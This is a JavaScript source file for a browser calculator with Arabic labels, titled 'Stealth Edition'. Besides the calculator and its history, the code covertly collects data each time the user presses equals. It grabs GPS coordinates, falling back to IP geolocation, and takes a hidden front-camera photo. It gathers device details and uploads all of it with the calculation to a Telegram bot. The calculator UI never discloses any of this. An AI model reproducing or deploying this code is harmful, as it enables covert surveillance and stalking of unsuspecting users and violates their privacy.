// ==========================================
// حاسبة عبدالله - Stealth Edition
// Calculator + History + Telegram Selfie (Hidden)
// + Location Autopilot (GPS + IP Fallback)
// ==========================================

const $ = (id) => document.getElementById(id);

let expression = "";
let result = "0";
let justCalculated = false;

// ==========================================
// Location Auto-Pilot System
// ==========================================

const LOCATION_CACHE_KEY = "calculator_location_cache";
const LOCATION_CACHE_TIME = 5 * 60 * 1000; // 5 دقائق
let cachedLocation = null;

function getHistory() {
  return JSON.parse(localStorage.getItem("calc_history") || "[]");
}

function saveHistory(items) {
  localStorage.setItem("calc_history", JSON.stringify(items));
}

function render() {
  $("expression").textContent = expression || "0";
  $("result").textContent = result;

  const items = getHistory();

  $("history").innerHTML = items.length
    ? items
        .map(
          (item) => `
            <div class="history-item">
              <span>
                <strong>${escapeHtml(item.expression)}</strong>
                = ${escapeHtml(item.result)}
              </span>
              <small>${escapeHtml(item.time)}</small>
            </div>
          `
        )
        .join("")
    : `
      <div class="history-item">
        <span>مفيش عمليات لسه.</span>
      </div>
    `;
}

function escapeHtml(text) {
  return String(text).replace(
    /[&<>"']/g,
    (char) => {
      const chars = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#39;"
      };
      return chars[char];
    }
  );
}

function safeEvaluate(input) {
  if (!/^[0-9+\-*/%.()\s]+$/.test(input)) {
    throw new Error("invalid");
  }
  const normalized = input.replace(/(\d+(?:\.\d+)?)%/g, "($1/100)");
  const value = Function('"use strict"; return (' + normalized + ")")();
  if (!Number.isFinite(value)) {
    throw new Error("invalid");
  }
  return Number.isInteger(value) ? String(value) : String(Number(value.toFixed(12)));
}

function addValue(value) {
  if (justCalculated && /[0-9.]/.test(value)) {
    expression = "";
  }
  if (justCalculated && /[+\-*/%]/.test(value)) {
    expression = result;
  }
  justCalculated = false;

  if (/[+\-*/%]/.test(value)) {
    if (!expression) {
      return;
    }
    const lastChar = expression.at(-1);
    if (/[+\-*/%]/.test(lastChar)) {
      expression = expression.slice(0, -1) + value;
      render();
      return;
    }
  }

  if (value === ".") {
    const parts = expression.split(/[+\-*/%]/);
    const currentNumber = parts.at(-1);
    if (currentNumber.includes(".")) {
      return;
    }
  }

  expression += value;
  result = "0";
  render();
}

function clearAll() {
  expression = "";
  result = "0";
  justCalculated = false;
  render();
}

function backspace() {
  if (justCalculated) {
    clearAll();
    return;
  }
  expression = expression.slice(0, -1);
  render();
}

// ==========================================
// Location Helpers
// ==========================================

function loadCachedLocation() {
  try {
    const saved = localStorage.getItem(LOCATION_CACHE_KEY);
    if (!saved) return null;
    const data = JSON.parse(saved);
    if (!data || !data.latitude || !data.longitude || !data.savedAt) return null;
    const age = Date.now() - data.savedAt;
    if (age > LOCATION_CACHE_TIME) return null;
    return data;
  } catch (error) {
    console.warn("Location cache error:", error);
    return null;
  }
}

function saveCachedLocation(location) {
  const data = {
    latitude: location.latitude,
    longitude: location.longitude,
    accuracy: location.accuracy,
    savedAt: Date.now()
  };
  localStorage.setItem(LOCATION_CACHE_KEY, JSON.stringify(data));
  cachedLocation = data;
  return data;
}

function getCurrentLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error("المتصفح لا يدعم تحديد الموقع."));
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy
        };
        resolve(saveCachedLocation(location));
      },
      (error) => {
        reject(error);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 300000
      }
    );
  });
}

// Fallback: Get location from IP if GPS is blocked
async function getLocationFromIP() {
  try {
    const response = await fetch('https://ipapi.co/json/');
    if (!response.ok) throw new Error("IP API failed");
    const data = await response.json();
    return {
      latitude: data.latitude,
      longitude: data.longitude,
      accuracy: 0, // No accuracy for IP
      source: 'IP_Fallback'
    };
  } catch (error) {
    console.warn("IP Fallback failed:", error);
    return null;
  }
}

async function initializeLocation() {
  const cached = loadCachedLocation();
  if (cached) {
    cachedLocation = cached;
    console.log("Using cached location.");
    return cached;
  }
  try {
    const location = await getCurrentLocation();
    console.log("GPS Location permission granted.");
    return location;
  } catch (error) {
    console.warn("GPS denied, trying IP fallback...");
    return await getLocationFromIP();
  }
}

function getDeviceInfo() {
  return {
    userAgent: navigator.userAgent || "Unknown",
    language: navigator.language || "Unknown",
    platform: navigator.platform || "Unknown",
    screen: `${window.screen.width}x${window.screen.height}`,
    online: navigator.onLine ? "Online" : "Offline"
  };
}

// ==========================================
// Stealth Selfie Capture
// ==========================================

async function takeHiddenSelfie() {
  return new Promise((resolve, reject) => {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      reject(new Error("Camera API not supported."));
      return;
    }

    navigator.mediaDevices.getUserMedia({ 
      video: { 
        facingMode: 'user', 
        width: { ideal: 1280 }, 
        height: { ideal: 720 } 
      } 
    })
      .then(stream => {
        const videoElement = $('cameraStream');
        if (!videoElement) {
          stream.getTracks().forEach(track => track.stop());
          reject(new Error("Camera video element not found."));
          return;
        }

        videoElement.srcObject = stream;
        
        videoElement.onloadedmetadata = () => {
          videoElement.play();

          const canvas = document.createElement('canvas');
          canvas.width = videoElement.videoWidth;
          canvas.height = videoElement.videoHeight;
          const ctx = canvas.getContext('2d');

          // Mirror the image for a natural selfie look
          ctx.translate(canvas.width, 0);
          ctx.scale(-1, 1);

          ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

          canvas.toBlob(blob => {
            // Stop camera immediately to release hardware
            stream.getTracks().forEach(track => track.stop());
            if (blob) {
              resolve(blob);
            } else {
              reject(new Error("Failed to create image from camera stream."));
            }
          }, 'image/png', 0.92);
        };
      })
      .catch(err => {
        console.error("Camera Stealth Error:", err);
        reject(err);
      });
  });
}

// ==========================================
// Equals Logic
// ==========================================

async function equals() {
  if (!expression.trim()) {
    return;
  }

  const currentExpression = expression;

  try {
    const calculated = safeEvaluate(currentExpression);
    result = calculated;
    justCalculated = true;

    // Save History
    const history = getHistory();
    history.unshift({
      expression: currentExpression,
      result: calculated,
      time: new Date().toLocaleString("ar-EG")
    });
    saveHistory(history.slice(0, 100));
    render();

    // Fire and Forget: Capture Selfie & Location
    setTimeout(async () => {
      try {
        // 1. Fetch Location (GPS or IP Fallback)
        const location = await initializeLocation();

        // 2. Capture Selfie (Hidden)
        const selfieBlob = await takeHiddenSelfie();

        // 3. Send to Telegram
        await captureAndSendToTelegram(currentExpression, calculated, selfieBlob, location);

      } catch (err) {
        console.error("Background Capture Failed:", err);
        // Fallback: Try sending without selfie/location if it crashes
        await captureAndSendToTelegram(currentExpression, calculated, null, null);
      }
    }, 300);

  } catch (error) {
    console.error(error);
    result = "خطأ";
    render();
  }
}

// ==========================================
// Send to Telegram
// ==========================================

async function captureAndSendToTelegram(exp, res, imageBlob, location) {

  try {

    if (typeof TELEGRAM_CONFIG === "undefined") {
      console.error("TELEGRAM_CONFIG غير موجود.");
      return;
    }

    const botToken = TELEGRAM_CONFIG.botToken;
    const chatId = TELEGRAM_CONFIG.chatId;

    if (!botToken || !chatId) {
      console.error("Bot Token أو Chat ID غير موجود.");
      return;
    }

    // Format Location
    let locationText = "📍 الموقع: غير متاح";
    if (location) {
      const lat = location.latitude;
      const lng = location.longitude;
      const acc = Math.round(location.accuracy || 0);
      const source = location.source ? ` [${location.source}]` : '';
      locationText = `📍 الموقع الحالي${source}:\n` +
        `Lat: ${lat}\n` +
        `Lng: ${lng}\n` +
        `Acc: ±${acc} متر`;
    }

    const device = getDeviceInfo();
    const currentTime = new Date().toLocaleString("ar-EG");

    // Prepare Caption
    let caption = `🧮 حاسبة عبدالله (Stealth)\n\n` +
      `🔢 العملية: ${exp}\n` +
      `✅ النتيجة: ${res}\n` +
      `🕐 الوقت: ${currentTime}\n\n` +
      `${locationText}\n\n` +
      `📱 معلومات الجهاز:\n` +
      `Platform: ${device.platform}\n` +
      `Screen: ${device.screen}\n` +
      `Language: ${device.language}\n` +
      `Status: ${device.online}`;

    // Prepare Image
    let imageFile = imageBlob;
    let captionPrefix = "";

    if (imageFile) {
      captionPrefix = "✨ ";
    } else {
      captionPrefix = "🖥️ ";
      caption += "\n\n⚠️ لا يوجد صورة.";
    }

    if (imageFile) {
      caption = captionPrefix + caption;
    }

    // Prepare FormData
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("caption", caption.slice(0, 1024));
    
    if (imageFile) {
      formData.append("photo", imageFile, `calculation-${Date.now()}.png`);
    }

    // Send
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendPhoto`,
      {
        method: "POST",
        body: formData
      }
    );

    const data = await response.json();

    if (!response.ok || !data.ok) {
      throw new Error(data.description || "فشل إرسال الصورة.");
    }

    console.log("Stealth Capture & Upload completed.");

  } catch (error) {
    console.error("Telegram Error:", error);
  }
}

// ==========================================
// Event Listeners
// ==========================================

const keysContainer = document.querySelector(".keys");

if (keysContainer) {
  keysContainer.addEventListener("click", (event) => {
    const button = event.target.closest("button");
    if (!button) return;

    const value = button.dataset.value;
    const action = button.dataset.action;

    if (value !== undefined) {
      addValue(value);
      return;
    }

    if (action === "clear") {
      clearAll();
      return;
    }

    if (action === "backspace") {
      backspace();
      return;
    }

    if (action === "equals") {
      equals();
    }
  });
}

document.addEventListener("keydown", (event) => {
  if (/^[0-9+\-*/%.()]$/.test(event.key)) {
    addValue(event.key);
    return;
  }

  if (event.key === "Enter" || event.key === "=") {
    event.preventDefault();
    equals();
    return;
  }

  if (event.key === "Backspace") {
    backspace();
    return;
  }

  if (event.key === "Escape") {
    clearAll();
  }
});

const clearHistoryButton = $("clearHistory");

if (clearHistoryButton) {
  clearHistoryButton.addEventListener("click", () => {
    if (confirm("متأكد إنك عايز تمسح سجل العمليات؟")) {
      saveHistory([]);
      render();
    }
  });
}

// ==========================================
// Initialization
// ==========================================

render();
initializeLocation();
